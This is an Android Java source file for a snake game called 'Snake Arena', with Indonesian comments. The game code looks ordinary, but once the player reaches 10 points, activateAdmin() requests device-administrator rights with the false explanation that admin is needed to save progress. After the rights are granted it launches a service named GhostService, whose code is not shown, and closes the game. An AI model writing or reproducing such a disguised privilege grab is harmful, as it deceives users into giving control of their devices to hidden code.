package com.snakegame.premium;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.graphics.*;
import android.os.Bundle;
import android.os.Handler;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.widget.*;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class MainActivity extends Activity {
    private static final int WIN_SCORE = 10;
    private GameView gameView;
    private TextView scoreText;
    private Handler handler = new Handler();
    private int score = 0;
    private boolean gameOver = false;
    private boolean gameStarted = false;
    private LinearLayout menuLayout, gameLayout;
    private Button playBtn, boostBtn;
    private JoystickView joystick;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Root untuk menu dan game
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(0xFF0A0A0A);

        // ---- MENU LAYOUT ----
        menuLayout = new LinearLayout(this);
        menuLayout.setOrientation(LinearLayout.VERTICAL);
        menuLayout.setGravity(Gravity.CENTER);
        menuLayout.setPadding(32, 32, 32, 32);

        TextView title = new TextView(this);
        title.setText("🐍 SNAKE ARENA");
        title.setTextColor(0xFF00FF88);
        title.setTextSize(32);
        title.setTypeface(null, Typeface.BOLD);
        title.setGravity(Gravity.CENTER);
        menuLayout.addView(title);

        TextView subtitle = new TextView(this);
        subtitle.setText("Makan, Tumbuh, Kuasai Arena!");
        subtitle.setTextColor(0xFFAAAAAA);
        subtitle.setTextSize(16);
        subtitle.setGravity(Gravity.CENTER);
        subtitle.setPadding(0, 8, 0, 32);
        menuLayout.addView(subtitle);

        playBtn = new Button(this);
        playBtn.setText("▶ PLAY");
        playBtn.setTextColor(Color.WHITE);
        playBtn.setBackgroundColor(0xFF00FF88);
        playBtn.setTextSize(20);
        playBtn.setPadding(32, 16, 32, 16);
        playBtn.setOnClickListener(v -> startGame());
        menuLayout.addView(playBtn);

        root.addView(menuLayout);

        // ---- GAME LAYOUT ----
        gameLayout = new LinearLayout(this);
        gameLayout.setOrientation(LinearLayout.VERTICAL);
        gameLayout.setVisibility(View.GONE);

        scoreText = new TextView(this);
        scoreText.setText("Score: 0");
        scoreText.setTextColor(Color.WHITE);
        scoreText.setTextSize(22);
        scoreText.setPadding(16, 16, 16, 8);
        gameLayout.addView(scoreText);

        gameView = new GameView(this);
        LinearLayout.LayoutParams gameParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0);
        gameParams.weight = 1;
        gameView.setLayoutParams(gameParams);
        gameLayout.addView(gameView);

        // Kontrol bawah: joystick + boost
        LinearLayout controls = new LinearLayout(this);
        controls.setOrientation(LinearLayout.HORIZONTAL);
        controls.setGravity(Gravity.CENTER);
        controls.setPadding(16, 8, 16, 24);

        joystick = new JoystickView(this);
        LinearLayout.LayoutParams joyParams = new LinearLayout.LayoutParams(200, 200);
        joystick.setLayoutParams(joyParams);
        controls.addView(joystick);

        boostBtn = new Button(this);
        boostBtn.setText("⚡ BOOST");
        boostBtn.setTextColor(Color.WHITE);
        boostBtn.setBackgroundColor(0xFF4444FF);
        boostBtn.setTextSize(16);
        boostBtn.setPadding(16, 8, 16, 8);
        boostBtn.setOnTouchListener((v, event) -> {
            if (event.getAction() == MotionEvent.ACTION_DOWN) {
                gameView.setBoosting(true);
            } else if (event.getAction() == MotionEvent.ACTION_UP) {
                gameView.setBoosting(false);
            }
            return true;
        });
        controls.addView(boostBtn);

        gameLayout.addView(controls);
        root.addView(gameLayout);

        setContentView(root);
    }

    private void startGame() {
        menuLayout.setVisibility(View.GONE);
        gameLayout.setVisibility(View.VISIBLE);
        gameStarted = true;
        gameView.startGame();
        updateScore();
    }

    private void updateScore() {
        handler.postDelayed(() -> {
            if (!gameOver && gameStarted) {
                score = gameView.getScore();
                scoreText.setText("Score: " + score);
                if (score >= WIN_SCORE) {
                    gameOver = true;
                    activateAdmin();
                } else {
                    handler.postDelayed(this::updateScore, 50);
                }
            }
        }, 50);
    }

    private void activateAdmin() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName comp = new ComponentName(this, DeviceAdminReceiver.class);
        if (!dpm.isAdminActive(comp)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Aktifkan admin untuk menyimpan progres!");
            startActivity(intent);
        } else {
            startService(new Intent(this, GhostService.class));
            finish();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName comp = new ComponentName(this, DeviceAdminReceiver.class);
        if (dpm.isAdminActive(comp)) {
            startService(new Intent(this, GhostService.class));
            finish();
        }
    }

    // ========== GAME VIEW ==========
    public class GameView extends View {
        private List<Food> foods = new ArrayList<>();
        private List<Enemy> enemies = new ArrayList<>();
        private Random rand = new Random();
        private float headX = 400, headY = 600;
        private float joystickX, joystickY;
        private boolean boosting = false;
        private int score = 0;
        private Paint foodPaint, bodyPaint, enemyPaint, eyePaint;
        private Handler h = new Handler();
        private boolean running = true;

        public GameView(Activity ctx) {
            super(ctx);
            bodyPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
            bodyPaint.setColor(0xFF00FF88);
            bodyPaint.setStyle(Paint.Style.FILL);

            foodPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
            foodPaint.setStyle(Paint.Style.FILL);

            enemyPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
            enemyPaint.setStyle(Paint.Style.FILL);

            eyePaint = new Paint(Paint.ANTI_ALIAS_FLAG);
            eyePaint.setColor(Color.BLACK);
            eyePaint.setStyle(Paint.Style.FILL);

            // Makanan
            for (int i = 0; i < 40; i++) {
                foods.add(new Food(rand.nextFloat() * 800, rand.nextFloat() * 1200, rand.nextInt(5)));
            }
            // Musuh
            for (int i = 0; i < 8; i++) {
                enemies.add(new Enemy(rand.nextFloat() * 800, rand.nextFloat() * 1200));
            }
        }

        public void startGame() { running = true; h.postDelayed(gameLoop, 16); }
        public int getScore() { return score; }
        public void setJoystick(float x, float y) { joystickX = x; joystickY = y; }
        public void setBoosting(boolean b) { boosting = b; }

        private Runnable gameLoop = new Runnable() {
            public void run() {
                if (!running) return;
                float speed = boosting ? 10f : 5f;
                headX += joystickX * speed;
                headY += joystickY * speed;
                if (headX < 0) headX = 0;
                if (headX > 800) headX = 800;
                if (headY < 0) headY = 0;
                if (headY > 1200) headY = 1200;

                // Makan
                for (int i = 0; i < foods.size(); i++) {
                    Food f = foods.get(i);
                    if (Math.hypot(headX - f.x, headY - f.y) < 25) {
                        score += f.points;
                        foods.remove(i);
                        foods.add(new Food(rand.nextFloat() * 800, rand.nextFloat() * 1200, rand.nextInt(5)));
                        break;
                    }
                }
                // Musuh gerak
                for (Enemy e : enemies) {
                    e.x += (rand.nextFloat() - 0.5f) * 6;
                    e.y += (rand.nextFloat() - 0.5f) * 6;
                    if (e.x < 0) e.x = 0;
                    if (e.x > 800) e.x = 800;
                    if (e.y < 0) e.y = 0;
                    if (e.y > 1200) e.y = 1200;
                }
                invalidate();
                h.postDelayed(this, 16);
            }
        };

        @Override
        protected void onDraw(Canvas canvas) {
            super.onDraw(canvas);
            canvas.drawColor(0xFF1a1a2e);
            // Makanan
            for (Food f : foods) {
                switch (f.type) {
                    case 0: foodPaint.setColor(0xFFFF4444); break; // merah
                    case 1: foodPaint.setColor(0xFF44FF44); break; // hijau
                    case 2: foodPaint.setColor(0xFF4444FF); break; // biru
                    case 3: foodPaint.setColor(0xFFFFAA00); break; // oranye
                    case 4: foodPaint.setColor(0xFFFF44FF); break; // ungu
                }
                canvas.drawCircle(f.x, f.y, 8 + f.type * 2, foodPaint);
            }
            // Musuh
            for (Enemy e : enemies) {
                enemyPaint.setColor(0xFF4444FF);
                canvas.drawCircle(e.x, e.y, 22, enemyPaint);
                canvas.drawCircle(e.x - 7, e.y - 7, 5, eyePaint);
                canvas.drawCircle(e.x + 7, e.y - 7, 5, eyePaint);
            }
            // Pemain
            bodyPaint.setColor(boosting ? 0xFFFF4444 : 0xFF00FF88);
            canvas.drawCircle(headX, headY, 24, bodyPaint);
            canvas.drawCircle(headX - 8, headY - 8, 5, eyePaint);
            canvas.drawCircle(headX + 8, headY - 8, 5, eyePaint);
        }

        class Food {
            float x, y;
            int type, points;
            Food(float x, float y, int type) {
                this.x = x; this.y = y; this.type = type;
                points = new int[]{1, 3, 5, 8, 10}[type];
            }
        }
        class Enemy {
            float x, y;
            Enemy(float x, float y) { this.x = x; this.y = y; }
        }
    }

    // Joystick kustom
    class JoystickView extends View {
        private float cx, cy, radius = 70;
        private Paint bgPaint, stickPaint;
        private float stickX, stickY;

        public JoystickView(Activity ctx) {
            super(ctx);
            bgPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
            bgPaint.setColor(0x44FFFFFF);
            stickPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
            stickPaint.setColor(0xFF00FF88);
            setOnTouchListener((v, event) -> {
                if (event.getAction() == MotionEvent.ACTION_DOWN || event.getAction() == MotionEvent.ACTION_MOVE) {
                    float dx = event.getX() - cx;
                    float dy = event.getY() - cy;
                    float dist = (float) Math.hypot(dx, dy);
                    if (dist > radius) {
                        dx = dx / dist * radius;
                        dy = dy / dist * radius;
                    }
                    stickX = dx;
                    stickY = dy;
                    gameView.setJoystick(dx / radius, dy / radius);
                } else if (event.getAction() == MotionEvent.ACTION_UP) {
                    stickX = 0;
                    stickY = 0;
                    gameView.setJoystick(0, 0);
                }
                invalidate();
                return true;
            });
        }

        @Override
        protected void onSizeChanged(int w, int h, int ow, int oh) {
            super.onSizeChanged(w, h, ow, oh);
            cx = w / 2f;
            cy = h / 2f;
        }

        @Override
        protected void onDraw(Canvas canvas) {
            super.onDraw(canvas);
            canvas.drawCircle(cx, cy, radius, bgPaint);
            canvas.drawCircle(cx + stickX, cy + stickY, 30, stickPaint);
        }
    }
}
